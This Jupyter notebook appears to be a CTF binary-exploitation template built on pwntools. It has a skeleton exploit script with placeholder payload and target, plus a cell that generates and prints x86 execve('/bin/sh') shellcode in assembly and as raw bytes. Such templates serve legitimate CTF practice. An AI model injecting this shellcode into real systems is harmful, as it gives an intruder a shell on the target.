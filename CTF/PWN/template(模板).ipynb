{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: TERMINFO=/usr/share/terminfo\n",
      "env: PWNLIB_NOTERM=true\n"
     ]
    }
   ],
   "source": [
    "%env TERMINFO=/usr/share/terminfo\n",
    "%env PWNLIB_NOTERM=true"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[*] Checking for new versions of pwntools\n",
      "    To disable this functionality, set the contents of /home/zhuangbin/.pwntools-cache/update to 'never'.\n",
      "[*] You have the latest version of Pwntools (3.12.1)\n"
     ]
    }
   ],
   "source": [
    "# -*- coding: utf-8 -*-\n",
    "#!/usr/bin/env python2\n",
    "from pwn import *\n",
    "context.log_level = 'debug'\n",
    "context.arch = 'x86' #amd64,x86\n",
    "LOCAL = True\n",
    "if LOCAL:\n",
    "    p = process('filename')\n",
    "else:\n",
    "    p = remote('127.0.0.1',10001)\n",
    "\n",
    "def main():\n",
    "    gdb.attach(p,'b *main')#gdb attach\n",
    "    payload = 'payload:***'\n",
    "    p.recvuntil('XXX:')\n",
    "    p.sendline(payload)\n",
    "    p.interactive()\n",
    "\n",
    "if __name__ == '__main__':\n",
    "    main()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "    /* execve(path='/bin///sh', argv=['sh'], envp=0) */\n",
      "    /* push '/bin///sh\\x00' */\n",
      "    push 0x68\n",
      "    push 0x732f2f2f\n",
      "    push 0x6e69622f\n",
      "    mov ebx, esp\n",
      "    /* push argument array ['sh\\x00'] */\n",
      "    /* push 'sh\\x00\\x00' */\n",
      "    push 0x1010101\n",
      "    xor dword ptr [esp], 0x1016972\n",
      "    xor ecx, ecx\n",
      "    push ecx /* null terminate */\n",
      "    push 4\n",
      "    pop ecx\n",
      "    add ecx, esp\n",
      "    push ecx /* 'sh\\x00' */\n",
      "    mov ecx, esp\n",
      "    xor edx, edx\n",
      "    /* call execve() */\n",
      "    push SYS_execve /* 0xb */\n",
      "    pop eax\n",
      "    int 0x80\n",
      "\n",
      "jhh///sh/bin��h\u0001\u0001\u0001\u0001�4$ri\u0001\u00011�Qj\u0004Y\u0001�Q��1�j\u000b",
      "X̀\n"
     ]
    }
   ],
   "source": [
    "#生成shellcode\n",
    "print(shellcraft.sh())\n",
    "print(asm(shellcraft.sh()))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.15+"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
